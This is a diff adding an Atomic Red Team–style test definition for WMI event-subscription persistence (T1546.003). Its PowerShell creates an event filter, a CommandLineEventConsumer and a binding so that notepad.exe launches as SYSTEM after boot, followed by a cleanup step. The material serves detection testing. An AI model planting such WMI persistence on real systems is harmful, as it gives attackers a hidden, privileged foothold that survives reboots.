@@ -1,0 +1,44 @@
+{
+  "id": "3c64f177-28e2-49eb-a799-d767b24dd1e0",
+  "name": "Persistence via WMI Event Subscription - CommandLineEventConsumer",
+  "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af\n\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "8bea26ea-465f-4bc0-a995-9acfe8412669",
+      "type": "execute-command",
+      "data": {
+        "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                EventNameSpace='root\\CimV2';\n                QueryLanguage=\"WQL\";\n                Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime \u003e= 240 AND TargetInstance.SystemUpTime \u003c 325\"};\n$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs\n\n$ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';\n                CommandLineTemplate=\"$($Env:SystemRoot)\\System32\\notepad.exe\";}\n$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs\n\n$FilterToConsumerArgs = @{\nFilter = [Ref] $Filter;\nConsumer = [Ref] $Consumer;\n}\n$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8acfa7eb-19a5-4297-8ef2-a048aac5bad5",
+      "type": "execute-command",
+      "data": {
+        "command": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'\"\n$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue\n$FilterConsumerBindingToCleanup | Remove-WmiObject\n$EventConsumerToCleanup | Remove-WmiObject\n$EventFilterToCleanup | Remove-WmiObject\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "8bea26ea-465f-4bc0-a995-9acfe8412669",
+      "p": "on-success",
+      "o": "8acfa7eb-19a5-4297-8ef2-a048aac5bad5"
+    },
+    {
+      "s": "8bea26ea-465f-4bc0-a995-9acfe8412669",
+      "p": "on-failure",
+      "o": "8acfa7eb-19a5-4297-8ef2-a048aac5bad5"
+    }
+  ],
+  "tags": [
+    "T1546.003",
+    "atomic-red-team"
+  ]
+}
